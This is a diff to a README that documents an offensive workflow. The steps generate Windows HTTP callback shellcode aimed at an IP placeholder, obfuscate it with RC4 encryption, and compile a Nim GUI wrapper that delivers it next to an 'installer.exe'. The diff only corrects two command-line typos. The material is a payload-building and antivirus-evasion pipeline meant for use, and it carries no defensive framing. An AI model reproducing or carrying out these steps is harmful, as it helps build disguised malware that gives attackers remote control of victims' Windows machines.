@@ -13,7 +13,7 @@
     ```
 2. Payload Generation
    ```
-     generate --http --os windows --arch amd64 --format shellcode --s /path/to/shellcode.bin
+     generate --http <IP> --os windows --arch amd64 --format shellcode --s /path/to/shellcode.bin
    ```
 3. Payload Obfuscation
    - Compile [rc4_encrypt.c](/scripts/rc4_encrypt.c)
@@ -27,7 +27,7 @@
 4. Payload Delivery
   - Compile [Wrapper Nim](/src/wrapper.nim) (Compilation made on a Windows host)
   ```
-    nim c -d:danger --cpu:amd64 --os:windows --ap:gui wrapper.nim
+    nim c -d:danger --cpu:amd64 --os:windows --app:gui wrapper.nim
   ```
   - Make sure the following files are in the same directory:
   `shellcode.enc` `installer.exe` `wrapper.nim`
